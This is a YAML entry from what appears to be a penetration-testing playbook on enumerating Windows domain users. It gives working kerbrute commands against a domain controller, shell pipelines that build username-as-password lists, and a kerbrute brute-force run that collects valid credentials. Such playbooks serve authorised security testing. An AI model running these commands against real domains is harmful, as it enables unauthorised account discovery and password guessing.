name: windows_domain_user_enum

info:
  title: Windows User Enumarations
  author: evait security GmbH
  book: internal-pentest
  category: 04_windows_domain
  placeholder: 
    - SMBDomain
    - DC_IP
  references:
    - https://github.com/ropnop/kerbrute

content: |
  <p>Enumarete through Kerberos Pre-Authentication<p>
  <code>kerbrute --dc @@DC_IP -d @@SMBDomain userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o kerbrute.txt</code>
  <p>Generate usefull lists (user-list, userpass-list)<p>
  <code>cat kerbrute.txt | grep '@' | cut -d'@' -f1 | cut -d ' ' -f 8| sort -u > kerbrute-users.txt
  for i in $(cat kerbrute-users.txt); do echo $i:$i ; done > kerbrute-userpass.txt</code>
  <p>test user as pass<p>
  <code>kerbrute --dc @@DC_IP -d @@SMBDomain bruteforce kerbrute-userpass.txt -o kerbrute-validcreds.txt</code>